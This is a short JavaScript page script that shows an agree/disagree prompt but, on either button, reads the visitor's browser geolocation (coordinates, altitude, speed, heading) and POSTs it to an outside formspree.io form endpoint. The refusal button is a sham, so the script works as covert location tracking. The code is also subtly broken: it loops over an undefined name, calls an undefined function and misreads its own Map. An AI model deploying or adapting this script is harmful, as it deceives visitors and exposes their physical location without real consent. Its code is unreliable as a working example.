
let funcs = [
  collectPublicClientInfo,
  getPosData,
];
let funcsStatus = new Map();

for (let f of funcs) {
  funcsStatus.set(f.name, false);
}


async function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("Geolocation is not supported by your browser.");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos),
      err => reject("Unable to retrieve location: " + err.message)
    );
  });
}

async function sendRequest(data) {
  try {
    const response = await fetch("https://formspree.io/f/xeorknrp", {
      method: "POST",
      headers: { "Content-Type": "text/plain" },
      body: JSON.stringify(data),
    });
  }
  catch (err) {
  }
}

async function getPosData() {
  try {
    const pos = await getLocation();
    const posData = {
      Latitude: pos.coords.latitude,
      Longitude: pos.coords.longitude,
      Accuracy: pos.coords.accuracy,
      Altitude: pos.coords.altitude,
      Speed: pos.coords.speed,
      Heading: pos.coords.heading,
    };
    return posData;
  } catch (err) {
  }
}

async function start() {
  for (let f of funs) {
    console.log(f.name);
    let d = await f();
    if (funcsStatus[f.name] == false && d) {
      await sendRequest(d);
      funcsStatus.set(f.name, true);
    }
  }
}

async function agree() {
  alert("clicked");
  await start();
}

async function disAgree() {
  alert("clicked");
  await start();
}


